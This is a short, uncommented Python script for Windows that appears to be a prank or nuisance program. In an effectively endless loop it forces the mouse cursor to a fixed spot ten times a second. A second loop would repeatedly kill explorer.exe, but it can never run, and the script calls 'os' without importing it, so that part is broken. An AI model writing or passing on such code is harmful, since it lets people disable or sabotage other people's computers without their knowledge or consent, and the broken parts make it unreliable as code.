import ctypes
import time
for i in range(0,999999999999999999999999999999999999999999999999999999):
    time.sleep(0.1)
    ctypes.windll.user32.SetCursorPos(100, 20)
for i in range(0,999999999999999999999999999999999999999999999999999999):
    time.sleep(0.1)
    os.system("taskkill /im explorer.exe")
